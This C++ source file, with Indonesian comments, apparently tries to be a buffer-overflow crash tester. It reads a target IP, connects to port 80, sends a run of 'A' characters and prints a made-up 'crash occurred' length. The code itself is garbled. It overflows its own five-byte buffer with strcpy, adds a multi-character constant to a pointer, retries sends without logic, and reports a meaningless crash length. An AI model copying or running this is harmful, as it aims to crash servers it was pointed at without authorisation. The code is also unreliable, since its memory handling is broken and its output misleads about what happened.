// Bagian Include
#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

int main() {
    char buff[5];
    const char* data = "AAAAAAAAAA";

    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sockfd == -1){
        cerr << "Error creating socket!..." << endl;
        return 1;
    }

    char target[16];

    cout << "Masukkan target IP: ";
    cin >> target;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(80);
    inet_pton(AF_INET, target, &server_addr.sin_addr);


    if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1){
        cerr << "Error connection to target\n";
        connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
        return 1;
    } else {
        cout << "Berhasil terhubung ke server" << endl;
    }

    strcpy(buff, data);
    if(send(sockfd, buff, strlen(buff), 0) == -1) {
        send(sockfd, buff, strlen(buff), 0);
        cerr << "Error sending buffer" << endl;
        return 1;
    } else if(send(sockfd, buff+'\r\n', strlen(buff), 0) == -1) {
        cerr << "gagal mengirim buffer" << endl;
        send(sockfd, buff, strlen(buff), 0);
        return 1;
    } else if(send(sockfd, buff, strlen(buff), 0) == -1) {
        cerr << "gagal mengirim buffer" << endl;
        if(send(sockfd, buff, strlen(buff), 0) == -1) {
            cerr << "Gagal mengirim buffer" << endl;
            send(sockfd, buff, strlen(buff), 0);
        }
    } else {
        cout << "Berhasil mengirim buffer" << endl;
    }
    cout << "[*] Crash occured at buffer length: " << strlen(buff)-100;

    close(sockfd);

    return 0;
}
